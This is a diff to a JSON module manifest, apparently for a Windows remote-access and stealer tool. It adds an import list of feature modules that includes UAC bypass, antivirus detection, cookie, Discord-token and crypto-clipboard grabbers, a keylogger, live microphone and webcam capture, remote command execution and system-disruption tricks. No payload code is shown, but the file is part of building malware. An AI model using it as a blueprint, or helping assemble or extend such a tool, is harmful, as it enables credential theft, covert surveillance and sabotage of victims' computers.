@@ -1,4 +1,34 @@
 {
+    "imports": [
+        ["resources/modules/misc.py", "imports"],
+        ["resources/modules/renderer.py", "imports"],
+        ["resources/modules/protections.py", "imports"],
+        ["resources/modules/uac_bypass.py", "imports"],
+        ["resources/modules/info.py", "imports"],
+        ["resources/modules/av_detect.py", "imports"],
+        ["resources/features/audio_control.py", "imports"],
+        ["resources/features/break_windows.py", "imports"],
+        ["resources/features/bsod.py", "imports"],
+        ["resources/features/cookie_grabber.py", "imports"],
+        ["resources/features/crypto_clipper.py", "imports"],
+        ["resources/features/discord_grabber.py", "imports"],
+        ["resources/features/fake_error.py", "imports"],
+        ["resources/features/file_management.py", "imports"],
+        ["resources/features/input_blocker.py", "imports"],
+        ["resources/features/jumpscare.py", "imports"],
+        ["resources/features/keystrokes.py", "imports"],
+        ["resources/features/live_mic.py", "imports"],
+        ["resources/features/monitor_control.py", "imports"],
+        ["resources/features/process_management.py", "imports"],
+        ["resources/features/remote_cmd.py", "imports"],
+        ["resources/features/screen_manipulation.py", "imports"],
+        ["resources/features/screen_record.py", "imports"],
+        ["resources/features/screenshot.py", "imports"],
+        ["resources/features/text-to-speech.py", "imports"],
+        ["resources/features/wallpaper.py", "imports"],
+        ["resources/features/webcam.py", "imports"],
+        ["resources/features/website_blocker.py", "imports"]
+    ],
     "preload": [
         ["resources/features/input_blocker.py", "preload"],
         ["resources/features/monitor_control.py", "preload"],
@@ -26,9 +56,7 @@
         ["resources/features/text-to-speech.py", "all"],
         ["resources/features/wallpaper.py", "all"],
         ["resources/features/webcam.py", "all"],
-        ["resources/features/website_blocker.py", "command"],
-        ["resources/features/.py", "all"],
-        ["resources/features/.py", "all"]
+        ["resources/features/website_blocker.py", "command"]
     ],
     "misc": [
         ["resources/modules/misc.py", "all"],
